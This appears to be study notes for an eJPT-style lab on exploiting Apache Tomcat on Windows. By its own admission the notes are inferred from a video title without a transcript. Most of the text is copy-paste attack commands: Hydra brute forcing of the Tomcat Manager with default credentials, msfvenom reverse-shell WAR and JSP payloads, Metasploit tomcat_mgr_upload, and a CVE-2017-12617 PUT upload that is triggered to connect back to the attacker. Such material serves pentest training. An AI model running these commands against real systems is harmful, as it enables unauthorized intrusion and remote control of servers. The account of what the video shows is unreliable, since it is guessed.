# Exploiting a Vulnerable Apache Tomcat Web Server (Windows)

Note: No transcript was provided. The steps below are inferred conservatively from the title and typical eJPT/Windows exploitation workflows for Apache Tomcat. Where module names/option names vary by Metasploit version, both common variants are shown.

## What the video covers (Introduction / big picture)
- Discovering and identifying a Tomcat service (often on port 8080) during a Windows pentest.
- Enumerating Tomcat endpoints (/manager, /host-manager) and authentication.
- Two common exploitation paths:
  - Tomcat Manager authentication + WAR deployment to get RCE (typical misconfiguration: default/weak creds).
  - CVE-2017-12617 (HTTP PUT) allowing direct JSP upload and execution.
- Using Metasploit and manual methods (msfvenom, curl, browser) to achieve a reverse shell.
- Basic post-exploitation checks on a Windows target.
- Cleanup (undeploy/remove artifacts).

## Flow (ordered)
1. Recon: Scan target for 80/8080/8009, enumerate HTTP titles/headers/methods.
2. Identify Tomcat: Confirm version and exposed apps (/manager/html, /host-manager/html).
3. Credential checking:
   - Try default creds or brute-force (Basic Auth on /manager/html).
   - Or use Metasploit’s tomcat_mgr_login scanner.
4. Exploit Path A (most common): Tomcat Manager deploys a WAR containing a reverse shell.
   - Create payload (WAR) with msfvenom or let Metasploit handle it.
   - Upload via Manager HTML UI or /manager/text API.
   - Catch reverse shell or Meterpreter.
5. Exploit Path B (if vulnerable): CVE-2017-12617 HTTP PUT
   - Verify PUT allowed.
   - Upload a JSP reverse shell directly to web root.
   - Trigger to obtain shell.
6. Post-exploitation: whoami, systeminfo, check service/user context, basic host recon.
7. Cleanup: undeploy WAR/JSP and remove traces.

## Tools highlighted
- Nmap (service/script scan, HTTP methods)
- curl (check headers/methods, deploy via text API, upload via PUT)
- Gobuster (optional content discovery)
- Hydra or Metasploit auxiliary for brute forcing Tomcat Manager
- Metasploit Framework (scanner + tomcat_mgr_upload/deploy exploit)
- msfvenom (generate WAR/JSP reverse shell)
- Netcat or Metasploit multi/handler (catch shells)
- Windows built-ins for post-exploitation (whoami, systeminfo)

## Typical command walkthrough (detailed, copy-paste friendly)

Set variables
```
export TARGET=10.10.10.10
export LHOST=10.10.14.5
export LPORT=4444
```

1) Recon and enumeration
```
nmap -p80,8080,8009 -sC -sV --script http-title,http-server-header,http-methods -oN nmap_tomcat.txt $TARGET

# Optional: directory busting on 8080
gobuster dir -u http://$TARGET:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x jsp,war,txt

# Check Tomcat Manager presence and auth
curl -i http://$TARGET:8080/manager/html
```

2) Try default credentials (manual or brute force)
- Common defaults to try in browser: admin:admin, tomcat:tomcat, tomcat:s3cret, admin:password, manager:manager
```
# Hydra brute force (HTTP Basic on /manager/html)
printf "admin\ntomcat\nmanager\n" > users.txt
printf "admin\npassword\ns3cret\ntomcat\n" > passes.txt
hydra -L users.txt -P passes.txt -s 8080 -f -V $TARGET http-get /manager/html
```

3) Exploit Path A: Tomcat Manager WAR deploy

Option A1: Metasploit automated (manager login + upload)
```
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS $TARGET
set RPORT 8080
set TARGETURI /manager/html
set USER_FILE users.txt
set PASS_FILE passes.txt
set STOP_ON_SUCCESS true
run

# Note found creds, then:
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $TARGET
set RPORT 8080
set TARGETURI /manager

# One of these will be correct depending on module version:
set HttpUsername tomcat
set HttpPassword s3cret
# or
set USERNAME tomcat
set PASSWORD s3cret

# Choose a payload
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
run
```

Option A2: Manual WAR generation + Manager UI upload
```
# Generate WAR reverse shell (JSP payload inside)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war

# Start a listener (either netcat or Metasploit handler)
nc -lvnp $LPORT
# OR
# msfconsole -q
# use exploit/multi/handler
# set PAYLOAD java/jsp_shell_reverse_tcp
# set LHOST $LHOST
# set LPORT $LPORT
# run

# In browser: http://$TARGET:8080/manager/html
# Login with discovered creds. Deploy "shell.war".
# After deploy, access: http://$TARGET:8080/shell/
# The name 'shell' comes from 'shell.war' (context path = /shell).
```

Option A3: Manager “text” API deploy via curl
```
# Deploy
curl -u 'tomcat:s3cret' --upload-file shell.war "http://$TARGET:8080/manager/text/deploy?path=/shell&update=true"

# Trigger reverse shell
curl http://$TARGET:8080/shell/

# Undeploy (cleanup)
curl -u 'tomcat:s3cret' "http://$TARGET:8080/manager/text/undeploy?path=/shell"
```

4) Exploit Path B: CVE-2017-12617 (HTTP PUT to upload JSP)
```
# Check methods allowed on root (or try likely contexts)
curl -i -X OPTIONS http://$TARGET:8080/

# Quick PUT probe
curl -i -X PUT -d "test" http://$TARGET:8080/test.txt

# If 201 Created/204 No Content returned, try uploading JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp

# Upload JSP via PUT
curl -i -X PUT --data-binary @shell.jsp http://$TARGET:8080/shell.jsp

# Start listener and trigger
nc -lvnp $LPORT
curl http://$TARGET:8080/shell.jsp
```

5) Post-exploitation (Windows quick checks)
```
whoami
whoami /priv
whoami /groups
systeminfo
ipconfig /all
netstat -ano
```

6) Cleanup
- Undeploy WAR via Manager or delete JSP if PUT was used:
```
curl -u 'tomcat:s3cret' "http://$TARGET:8080/manager/text/undeploy?path=/shell"
# For PUT path: if a delete-capable WebDAV endpoint exists you can try:
# curl -X DELETE http://$TARGET:8080/shell.jsp
# Otherwise rely on scope rules and report appropriately.
```

## Practical tips
- Always confirm you’re authorized to test. Tomcat Manager abuse is often due to weak credentials; document responsibly.
- If /manager/html is 401 (Basic Auth prompt), try defaults; if 403, the Manager may be IP-restricted.
- TARGETURI differences matter:
  - Metasploit often wants TARGETURI=/manager (not /manager/html).
  - The text API lives under /manager/text.
- WAR deploy path equals the WAR filename (shell.war -> /shell/). Avoid names that collide with existing apps.
- For more reliable egress, set LPORT to 80/443 if outbound filtering exists.
- Prefer java/meterpreter/reverse_tcp in Metasploit for stability; you can migrate to a Windows process after the session opens.
- On Windows, Tomcat typically installs under:
  - C:\Program Files\Apache Software Foundation\Tomcat X.X\
  - Config file with roles/users: conf\tomcat-users.xml (useful for local enumeration if you gain file read).
- Clean up: undeploy WARs and remove uploaded JSPs to minimize impact.

## Minimal cheat sheet (one-screen flow)
```
export TARGET=10.10.10.10; export LHOST=10.10.14.5; export LPORT=4444

# Recon
nmap -p80,8080,8009 -sC -sV --script http-title,http-server-header,http-methods -oN nmap.txt $TARGET
curl -i http://$TARGET:8080/manager/html

# Brute (if needed)
printf "admin\ntomcat\nmanager\n" > users.txt; printf "admin\npassword\ns3cret\ntomcat\n" > passes.txt
hydra -L users.txt -P passes.txt -s 8080 -f -V $TARGET http-get /manager/html

# Path A (Manager -> WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
nc -lvnp $LPORT
# Upload shell.war via Manager UI or:
curl -u 'tomcat:s3cret' --upload-file shell.war "http://$TARGET:8080/manager/text/deploy?path=/shell&update=true"
curl http://$TARGET:8080/shell/

# Path B (PUT -> JSP)
curl -i -X OPTIONS http://$TARGET:8080/
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
curl -i -X PUT --data-binary @shell.jsp http://$TARGET:8080/shell.jsp
nc -lvnp $LPORT; curl http://$TARGET:8080/shell.jsp

# Cleanup
curl -u 'tomcat:s3cret' "http://$TARGET:8080/manager/text/undeploy?path=/shell"
```

## Summary
- The likely video demonstrates exploiting an Apache Tomcat instance on a Windows target by:
  - Finding Tomcat via service scan and enumerating /manager endpoints.
  - Obtaining Manager credentials (defaults/brute forcing) and deploying a malicious WAR for RCE; or
  - Leveraging CVE-2017-12617 to upload a JSP via HTTP PUT and executing it to gain a reverse shell.
- Metasploit can automate discovery and exploitation (tomcat_mgr_login + tomcat_mgr_upload) with payloads like java/meterpreter/reverse_tcp.
- After shell, validate context and perform standard Windows enumeration. Always remove deployed artifacts when finished.